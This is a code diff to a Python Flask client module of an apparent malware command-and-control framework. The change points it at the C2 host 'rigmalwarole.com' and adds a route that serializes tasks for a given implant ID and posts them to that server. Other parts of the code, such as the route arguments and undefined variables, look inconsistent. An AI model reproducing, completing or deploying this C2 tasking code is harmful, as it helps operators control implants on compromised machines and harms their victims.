@@ -10,7 +10,7 @@ from cvnt.constants import opcodes
 import requests 
 
 client = Blueprint('client', __name__, template_folder='templates')
-c2 = "https://rigamalwarole.com"
+c2 = "https://rigmalwarole.com"
 task_list = "/task/list"
 task_create = "task/create"
 register = "/register"
@@ -56,16 +56,26 @@ def valid_command(cmd):
 def analyze_input(cmd, args):
     pass
 
-@client.route(request, methods=["POST"])
+
+@client.route('/task/request', methods=["POST"])
 def handle_t_request(implant_id, cmd, args):
     print(f'REQUEST FROM CLIENT')
     r = ClientTaskRequest()
     r.ImplantID = implant_id
-    r.JobID = 1
+    r.JobID = 1  # static for testing
     r.Function = cmd
     r.Inputs = args
     out = r.SerializeToString()
-#    r = requests.post(urljoin( c2, request), data = out)
+
+    # Correct URL to the send_task route
+    full_url = urljoin(c2, '/task/request')
+    response = requests.post(full_url, data=out)
+    if response.status_code == 200:
+        print("Task successfully sent to the RPC service.")
+    else:
+        print(f"Failed to send task, server responded with status code: {response.status_code}")
+    return response.text
+
 
 @client.route(response, methods=["POST"])
 def handle_t_response(implant_id, jobID, output):
